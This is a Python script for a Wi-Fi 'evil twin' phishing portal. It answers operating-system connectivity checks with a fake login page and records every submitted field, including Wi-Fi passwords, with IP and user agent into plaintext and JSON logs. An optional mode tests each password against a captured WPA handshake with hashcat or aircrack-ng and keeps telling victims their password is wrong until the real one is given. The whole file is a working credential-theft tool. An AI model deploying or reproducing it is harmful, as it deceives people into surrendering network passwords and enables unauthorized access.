#!/usr/bin/env python3
"""
Captive Portal Web Server with Credential Capture and Verification
Verifies passwords against captured handshake before allowing access
"""

import http.server
import urllib.parse
import os
import sys
import json
import threading
import subprocess
import time
from datetime import datetime
from pathlib import Path

# Configuration from environment or defaults
PORTAL_DIR = os.environ.get('PORTAL_DIR', '/tmp/portal')
CRED_LOG_DIR = os.environ.get('CRED_LOG_DIR', '/tmp/credentials')
REDIRECT_URL = os.environ.get('REDIRECT_URL', 'https://www.google.com')
BIND_ADDR = os.environ.get('BIND_ADDR', '10.0.0.1')
BIND_PORT = int(os.environ.get('BIND_PORT', '80'))
HANDSHAKE_FILE = os.environ.get('HANDSHAKE_FILE', '')  # Path to handshake for verification
VERIFY_MODE = os.environ.get('VERIFY_MODE', 'false').lower() == 'true'

# Color codes for terminal output
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
CYAN = '\033[0;36m'
WHITE = '\033[1;37m'
NC = '\033[0m'

# Ensure log directory exists
Path(CRED_LOG_DIR).mkdir(parents=True, exist_ok=True)

# Log file path
LOG_FILE = os.path.join(CRED_LOG_DIR, f"wifi_passwords_{datetime.now().strftime('%Y%m%d%H%M%S')}.txt")

# Track clients that have submitted credentials (by IP)
submitted_clients = {}  # ip -> list of timestamps
client_lock = threading.Lock()

# Track verified clients (correct password)
verified_clients = {}  # ip -> timestamp
verified_clients_lock = threading.Lock()


def verify_password(password, handshake_file):
    """Verify password against handshake using hashcat or aircrack"""
    if not handshake_file or not os.path.exists(handshake_file):
        print(f"{RED}[!] Handshake file not found: {handshake_file}{NC}")
        return None
        
    # Try to convert .cap to .hc22000 if needed
    hash_file = handshake_file
    if handshake_file.endswith('.cap'):
        hash_file = handshake_file.replace('.cap', '.hc22000')
        if not os.path.exists(hash_file):
            # Try conversion
            try:
                result = subprocess.run(['hcxpcapngtool', '-o', hash_file, handshake_file], 
                             capture_output=True, text=True, timeout=60)
                if result.returncode != 0:
                    print(f"{YELLOW}[!] hcxpcapngtool conversion: {result.stderr[:100] if result.stderr else 'failed'}{NC}")
            except Exception as e:
                print(f"{YELLOW}[!] Conversion error: {e}{NC}")
    
    # First try hashcat if hash file exists
    if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
        try:
            # Create temp file with password
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as pw_file:
                pw_file.write(password + '\n')
                pw_file.flush()
                pw_path = pw_file.name
            
            # Try hashcat with wordlist
            result = subprocess.run(
                ['hashcat', '-m', '22000', '-a', '0', hash_file, pw_path, '--force', '--quiet'],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            os.unlink(pw_path)
            
            # Check if password was cracked
            check_result = subprocess.run(
                ['hashcat', '-m', '22000', hash_file, '--show'],
                capture_output=True,
                text=True,
                timeout=30
            )
            if password in check_result.stdout:
                print(f"{GREEN}[✓] Password verified!{NC}")
                return True
        except Exception as e:
            print(f"{YELLOW}[!] Hashcat error: {e}{NC}")
    
    # Fallback: try aircrack directly
    try:
        result = subprocess.run(
            ['aircrack-ng', '-w', '-', '-q', handshake_file],
            input=password + '\n',
            capture_output=True,
            text=True,
            timeout=30
        )
        output = result.stdout + result.stderr
        if 'KEY FOUND' in output or 'Passphrase' in output:
            print(f"{GREEN}[✓] Password verified via aircrack!{NC}")
            return True
    except Exception as e:
        print(f"{YELLOW}[!] Aircrack error: {e}{NC}")
    
    print(f"{RED}[✗] Password verification failed{NC}")
    return False


class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler for captive portal"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PORTAL_DIR, **kwargs)

    def log_message(self, format, *args):
        """Custom log output for connections"""
        client_ip = self.client_address[0]
        msg = format % args
        # Show client connections in real-time
        if 'POST' in msg:
            return  # POST logs are handled separately
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{CYAN}[{timestamp}]{NC} {WHITE}Client:{NC} {client_ip} -> {msg}")

    def do_GET(self):
        """Handle GET requests - serve portal pages"""
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime('%H:%M:%S')

        # Captive portal detection endpoints - always return portal
        captive_paths = [
            '/generate_204',
            '/gen_204',
            '/hotspot-detect.html',
            '/hotspot-detect',
            '/connecttest.txt',
            '/success.txt',
            '/ncsi.txt',
            '/redirect',
            '/library/test/success.html',
            '/kindle-wifi/wifistub.html',
            '/check_network_status.txt',
        ]

        if self.path in captive_paths or self.path == '/':
            # Always serve the portal - even for returning clients
            # This ensures they can re-enter credentials on reconnection
            self.path = '/index.html'

            with client_lock:
                if client_ip in submitted_clients:
                    print(f"{YELLOW}[{timestamp}]{NC} {WHITE}Returning client:{NC} {client_ip} (submitted {len(submitted_clients[client_ip])}x before)")
                else:
                    print(f"{CYAN}[{timestamp}]{NC} {WHITE}New client:{NC} {client_ip}")

        # Check if file exists, otherwise serve index.html
        file_path = os.path.join(PORTAL_DIR, self.path.lstrip('/'))
        if not os.path.exists(file_path):
            self.path = '/index.html'

        print(f"{CYAN}[{timestamp}]{NC} {WHITE}Page view:{NC} {client_ip} -> {self.path}")
        return super().do_GET()

    def do_POST(self):
        """Handle POST requests - capture and verify credentials"""
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timestamp_short = datetime.now().strftime('%H:%M:%S')

        # Read POST data
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)

        # Extract all submitted fields
        credentials = {}
        for key, values in params.items():
            credentials[key] = values[0] if values else ''

        # Get user agent
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Get password from submission
        password = credentials.get('password', '')
        password_verified = False

        # VERIFY MODE: Check password against handshake
        if VERIFY_MODE and password and HANDSHAKE_FILE:
            print(f"\n{YELLOW}[{timestamp_short}] Verifying password against handshake...{NC}")
            password_verified = verify_password(password, HANDSHAKE_FILE)
            
            if password_verified:
                print(f"{GREEN}[✓] PASSWORD VERIFIED! Access granted.{NC}")
                # Mark client as verified
                with verified_clients_lock:
                    verified_clients[client_ip] = timestamp
            else:
                print(f"{RED}[✗] WRONG PASSWORD! Access denied.{NC}")

        # Track this submission
        with client_lock:
            if client_ip not in submitted_clients:
                submitted_clients[client_ip] = []
            submitted_clients[client_ip].append(timestamp)

        submission_count = len(submitted_clients.get(client_ip, []))

        # Real-time terminal output
        print(f"\n{GREEN}{'='*60}{NC}")
        if VERIFY_MODE and HANDSHAKE_FILE:
            if password_verified:
                print(f"{GREEN}[{timestamp_short}] ✓ CORRECT PASSWORD!{NC}")
            else:
                print(f"{RED}[{timestamp_short}] ✗ WRONG PASSWORD!{NC}")
        else:
            print(f"{GREEN}[{timestamp_short}] CREDENTIAL CAPTURED!{NC}")
        
        if submission_count > 1:
            print(f"{YELLOW}  (Attempt #{submission_count} from this client){NC}")
        print(f"{GREEN}{'='*60}{NC}")
        print(f"{WHITE}  IP Address:{NC}  {client_ip}")
        for key, value in credentials.items():
            label = key.capitalize()
            if key == 'password':
                print(f"{WHITE}  {label}:{NC}  {YELLOW}{'•' * len(value)}{NC}")
            else:
                print(f"{WHITE}  {label}:{NC}  {YELLOW}{value}{NC}")
        print(f"{WHITE}  User Agent:{NC} {user_agent[:60]}")
        print(f"{GREEN}{'='*60}{NC}\n")

        # Write to log file
        with open(LOG_FILE, 'a') as f:
            f.write(f"{'='*50}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"IP Address: {client_ip}\n")
            if VERIFY_MODE and HANDSHAKE_FILE:
                f.write(f"Verified: {'YES' if password_verified else 'NO'}\n")
            if submission_count > 1:
                f.write(f"Attempt: #{submission_count}\n")
            for key, value in credentials.items():
                f.write(f"{key.capitalize()}: {value}\n")
            f.write(f"User Agent: {user_agent}\n")
            f.write(f"{'='*50}\n\n")

        # Also save as JSON for programmatic access
        json_log = os.path.join(CRED_LOG_DIR, 'latest_capture.json')
        capture_data = {
            'timestamp': timestamp,
            'ip': client_ip,
            'attempt': submission_count,
            'verified': password_verified if (VERIFY_MODE and HANDSHAKE_FILE) else None,
            'credentials': credentials,
            'user_agent': user_agent
        }
        with open(json_log, 'w') as f:
            json.dump(capture_data, f, indent=2)

        # Append to all captures JSON
        all_captures_file = os.path.join(CRED_LOG_DIR, 'all_captures.json')
        all_captures = []
        if os.path.exists(all_captures_file):
            try:
                with open(all_captures_file, 'r') as f:
                    all_captures = json.load(f)
            except (json.JSONDecodeError, IOError):
                all_captures = []
        all_captures.append(capture_data)
        with open(all_captures_file, 'w') as f:
            json.dump(all_captures, f, indent=2)

        # Send response based on verification result
        if VERIFY_MODE and HANDSHAKE_FILE and password:
            if password_verified:
                # CORRECT PASSWORD - show success and allow internet
                redirect_html = """<!DOCTYPE html>
<html>
<head>
    <title>Connected</title>
    <meta http-equiv="refresh" content="3;url=""" + REDIRECT_URL + """">
    <style>
        body {
            font-family: -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: #10b981;
        }
        .message {
            background: white;
            padding: 40px 60px;
            border-radius: 12px;
            text-align: center;
        }
        .checkmark {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h2 { color: #1a1a1a; margin: 0 0 8px 0; }
        p { color: #65676b; margin: 0; }
    </style>
</head>
<body>
    <div class="message">
        <div class="checkmark">✓</div>
        <h2>Connected Successfully!</h2>
        <p>You now have internet access.</p>
    </div>
</body>
</html>"""
            else:
                # WRONG PASSWORD - show error and stay on portal
                redirect_html = """<!DOCTYPE html>
<html>
<head>
    <title>Wrong Password</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: #f0f2f5;
        }
        .message {
            background: white;
            padding: 40px 60px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 320px;
        }
        .error-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h2 { color: #dc2626; margin: 0 0 8px 0; }
        p { color: #65676b; margin: 0 0 20px 0; }
        .retry-btn {
            background: #007AFF;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="message">
        <div class="error-icon">✗</div>
        <h2>Incorrect Password</h2>
        <p>The password you entered is incorrect. Please try again.</p>
        <a href="/" class="retry-btn">Try Again</a>
    </div>
</body>
</html>"""
        else:
            # No verification - always show success
            redirect_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
    <meta http-equiv="refresh" content="3;url={REDIRECT_URL}">
    <style>
        body {{
            font-family: -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: #f0f2f5;
        }}
        .message {{
            background: white;
            padding: 40px 60px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        h2 {{ color: #1a1a1a; margin: 0 0 8px 0; }}
        p {{ color: #65676b; margin: 0; }}
    </style>
</head>
<body>
    <div class="message">
        <div class="spinner"></div>
        <h2>Authenticating...</h2>
        <p>Verifying your credentials. Please wait.</p>
    </div>
</body>
</html>"""

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', len(redirect_html))
        self.end_headers()
        self.wfile.write(redirect_html.encode())


class ThreadedHTTPServer(http.server.HTTPServer):
    """Handle requests in a threaded fashion for multiple clients"""
    allow_reuse_address = True

    def process_request(self, request, client_address):
        thread = threading.Thread(target=self._handle_request, args=(request, client_address))
        thread.daemon = True
        thread.start()

    def _handle_request(self, request, client_address):
        try:
            self.finish_request(request, client_address)
        except Exception:
            self.handle_error(request, client_address)
        finally:
            self.shutdown_request(request)


def main():
    print(f"\n{GREEN}{'='*60}{NC}")
    print(f"{GREEN}  Captive Portal Server Started{NC}")
    print(f"{GREEN}{'='*60}{NC}")
    print(f"{WHITE}  Listening:{NC}    http://{BIND_ADDR}:{BIND_PORT}")
    print(f"{WHITE}  Portal Dir:{NC}   {PORTAL_DIR}")
    print(f"{WHITE}  Credential Log:{NC} {LOG_FILE}")
    print(f"{WHITE}  Redirect URL:{NC}  {REDIRECT_URL}")
    print(f"{GREEN}{'='*60}{NC}")
    print(f"{YELLOW}  Waiting for connections...{NC}\n")

    server = ThreadedHTTPServer((BIND_ADDR, BIND_PORT), CaptivePortalHandler)

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Server shutting down...{NC}")
        server.shutdown()


if __name__ == '__main__':
    main()
